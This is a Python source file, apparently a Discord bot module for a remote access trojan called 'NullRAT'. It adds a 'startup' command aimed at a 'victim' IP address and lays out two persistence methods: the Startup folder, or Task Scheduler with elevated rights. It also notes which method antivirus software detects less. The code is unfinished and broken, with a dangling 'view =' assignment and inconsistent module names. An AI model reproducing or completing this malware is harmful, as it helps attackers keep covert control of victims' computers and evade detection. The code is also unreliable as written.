import disnake as discord
from disnake.ext import commands
from datetime import datetime
from sys import executable

import os, requests
nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"

global method

class Startup(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot
        self.ip_addr = self.bot.ip_addr
        
    @commands.slash_command(
        description="Add NullRAT to startup directory",
        options=[
            discord.Option("victim", description="IP Address of specific victim", required=True)
        ],
    )
    async def startup(self, ctx, victim):
        if str(victim) == str(self.ip_addr):
            await ctx.followup.send(
                embed = self.bot.genEmbed(
                    "Choose method for starting up",
                    datetime.now()
                ).add_field(
                    name = "Method 1: shell:startup",
                    value = """```
LEGACY METHOD, NO ADMIN REQUIRED

Copies the rat to "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" so that it can be started every time PC is turned on.
This method is detected by antiviruses, and has a chance to not work. However it needs no admin unlike the other method.```""",
                    inline = False
                ).add_field(
                    name = "Method 2: schtasks",
                    value = """```
MODERN METHOD, REQUIRES ADMIN ACCESS

Copies rat to cache folder, and adds the exe path to startup via Task Scheduler.
This method is less detected by antiviruses, but requires admin access to be granted. If not provided, the program will ask for admin.```""",
                    inline = False
                ),
                
                view = 
            )
            
class Confirm(disnake.ui.View):
    def __init__(self):
        super().__init__()
        self.value = None

    # When the confirm button is pressed, set the inner value to `True` and
    # stop the View from listening to more input.
    # We also send the user an ephemeral message that we're confirming their choice.
    @disnake.ui.button(label="Confirm", style=disnake.ButtonStyle.green)
    async def confirm(self, button: disnake.ui.Button, interaction: disnake.MessageInteraction):
        await interaction.response.send_message("Confirming", ephemeral=True)
        self.value = True
        self.stop()

    # This one is similar to the confirmation button except sets the inner value to `False`
    @disnake.ui.button(label="Cancel", style=disnake.ButtonStyle.grey)
    async def cancel(self, button: disnake.ui.Button, interaction: disnake.MessageInteraction):
        await interaction.response.send_message("Cancelling", ephemeral=True)
        self.value = False
        self.stop()

def setup(bot: commands.Bot):
    bot.add_cog(Startup(bot))